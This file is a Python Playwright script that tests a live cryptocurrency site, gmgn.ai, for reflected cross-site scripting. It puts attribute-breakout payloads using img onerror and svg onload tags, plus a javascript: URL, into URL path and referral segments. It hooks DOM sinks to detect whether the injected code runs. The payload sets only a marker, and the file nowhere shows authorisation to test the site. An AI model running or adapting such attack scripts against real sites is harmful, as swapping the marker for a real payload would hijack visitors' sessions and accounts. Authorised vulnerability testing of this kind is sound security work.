from __future__ import annotations

import json
import shutil
import time
import urllib.parse
from pathlib import Path

from playwright.sync_api import sync_playwright

BASE = "https://gmgn.ai"
RUN = f"GMGNTARGET{int(time.time())}"
JS = f"document.documentElement.dataset.xssExecuted='{RUN}'"

CASES = (
    {
        "name": "token_chain_baseline",
        "path": f"/{RUN}/token/So11111111111111111111111111111111111111112",
    },
    {
        "name": "token_chain_quote_breakout",
        "path": "/" + urllib.parse.quote(f'\"><img src=x onerror="{JS}">', safe="") + "/token/So11111111111111111111111111111111111111112",
    },
    {
        "name": "token_chain_svg_breakout",
        "path": "/" + urllib.parse.quote(f'\"><svg onload="{JS}"></svg>', safe="") + "/token/So11111111111111111111111111111111111111112",
    },
    {
        "name": "referral_baseline",
        "path": "/referral/" + RUN,
    },
    {
        "name": "referral_quote_breakout",
        "path": "/referral/" + urllib.parse.quote(f'\"><img src=x onerror="{JS}">', safe=""),
    },
    {
        "name": "referral_javascript_url",
        "path": "/referral/" + urllib.parse.quote(f"javascript:{JS}", safe=""),
    },
)


def main() -> int:
    chrome = next(
        (
            shutil.which(name)
            for name in ("google-chrome", "google-chrome-stable", "chromium", "chromium-browser")
            if shutil.which(name)
        ),
        None,
    )
    results = []
    init_script = f"""
    (() => {{
      const marker = {json.dumps(RUN)};
      const note = (kind, value) => {{
        try {{
          if (String(value).includes(marker) || String(value).includes('xssExecuted')) {{
            const root = document.documentElement;
            root.dataset.xssSink = (root.dataset.xssSink ? root.dataset.xssSink + ',' : '') + kind;
          }}
        }} catch (_) {{}}
      }};
      const descriptor = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
      if (descriptor && descriptor.get && descriptor.set) {{
        Object.defineProperty(Element.prototype, 'innerHTML', {{
          configurable: descriptor.configurable,
          enumerable: descriptor.enumerable,
          get: descriptor.get,
          set(value) {{ note('innerHTML', value); return descriptor.set.call(this, value); }}
        }});
      }}
      const originalSetAttribute = Element.prototype.setAttribute;
      Element.prototype.setAttribute = function(name, value) {{
        if (['src','srcdoc','href','data-widget-options'].includes(String(name).toLowerCase())) note('setAttribute:' + name, value);
        return originalSetAttribute.call(this, name, value);
      }};
      const originalOpen = window.open;
      window.open = function(url, ...rest) {{ note('window.open', url); return originalOpen.call(this, url, ...rest); }};
    }})();
    """

    with sync_playwright() as playwright:
        launch = {
            "headless": True,
            "args": [
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-extensions",
                "--no-first-run",
                "--disable-popup-blocking",
            ],
        }
        if chrome:
            launch["executable_path"] = chrome
        browser = playwright.chromium.launch(**launch)

        for case in CASES:
            context = browser.new_context(
                user_agent=(
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
                ),
                locale="en-US",
                timezone_id="UTC",
            )
            context.add_init_script(init_script)
            page = context.new_page()
            status = None
            error = None
            try:
                response = page.goto(BASE + case["path"], wait_until="domcontentloaded", timeout=30_000)
                status = response.status if response else None
                page.wait_for_timeout(2_500)
                state = page.evaluate(
                    """marker => {
                      const contexts = [];
                      for (const element of document.querySelectorAll('*')) {
                        for (const attribute of element.attributes || []) {
                          const value = String(attribute.value);
                          if (value.includes(marker) || value.includes('xssExecuted')) {
                            contexts.push({tag: element.tagName, name: attribute.name, value: value.slice(0, 500)});
                          }
                        }
                      }
                      return {
                        executed: document.documentElement.dataset.xssExecuted === marker,
                        sinks: document.documentElement.dataset.xssSink || '',
                        href: location.href,
                        contexts: contexts.slice(0, 30),
                        injectedNodes: document.querySelectorAll('img[onerror],svg[onload],script,iframe[srcdoc]').length
                      };
                    }""",
                    RUN,
                )
            except Exception as exc:  # noqa: BLE001
                error = f"{type(exc).__name__}: {exc}"
                state = {"executed": False, "sinks": "", "href": page.url, "contexts": [], "injectedNodes": 0}
            results.append(
                {
                    "name": case["name"],
                    "status": status,
                    "error": error,
                    **state,
                }
            )
            context.close()

        browser.close()

    report = {
        "generated_at": int(time.time()),
        "run_id": RUN,
        "scope": "Unauthenticated targeted browser validation with harmless DOM marker only",
        "case_count": len(CASES),
        "executions": [item["name"] for item in results if item["executed"]],
        "results": results,
    }
    Path("gmgn_targeted_reflection_xss.json").write_text(
        json.dumps(report, indent=2, ensure_ascii=False), encoding="utf-8"
    )
    print(json.dumps(report, indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
